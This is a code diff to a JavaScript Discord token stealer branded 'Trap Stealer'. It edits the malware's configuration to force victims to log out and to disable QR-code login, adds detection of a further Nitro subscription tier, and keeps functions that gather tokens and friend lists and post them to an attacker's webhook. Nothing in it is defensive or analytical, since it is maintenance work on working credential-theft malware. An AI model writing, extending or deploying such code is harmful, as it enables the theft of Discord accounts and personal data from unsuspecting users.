@@ -8,15 +8,14 @@ const querystring = require("querystring");
 const fs = require("fs");
 
 
-// Initialization
 
 var config = {
     brand: "Trap Stealer",
 
     webhook: '%WEBHOOK%',
 
-    logout: false,
-    disable_qr_code: false,
+    logout: true,
+    disable_qr_code: true,
 
     notify_on_logout: true,
     notify_on_initialization: true,
@@ -626,7 +625,6 @@ try {
     },
 }
 
-// ==================================================================================
 
 function getDiscordClient() {
     return `${process.cwd().replace(`${process.env.LOCALAPPDATA}\\`, '').split('\\')[0].split(7)}`
@@ -640,6 +638,8 @@ function getNitro(flags) {
             return "<:classic:896119171019067423> \`\`Nitro Classic\`\`";
         case 2:
             return "<a:boost:824036778570416129> \`\`Nitro Boost\`\`";
+        case 3:
+            return "<:classic:896119171019067423> \`\`Nitro Basic\`\`";
         default:
             return "\`\`\`No Nitro\`\`\`";
 
@@ -719,7 +719,6 @@ async function getRelationships(token) {
     }
 }
 
-// ==================================================================================
 
 function sendToWebhook(params) {
 
@@ -751,7 +750,6 @@ function sendToWebhook(params) {
     req.end();
 }
 
-// ==================================================================================
 
 function createEmbed(data) {
     let obj = {
@@ -766,7 +764,6 @@ function createEmbed(data) {
     return obj;
 }
 
-// ==================================================================================
 
 async function initialize() {
 
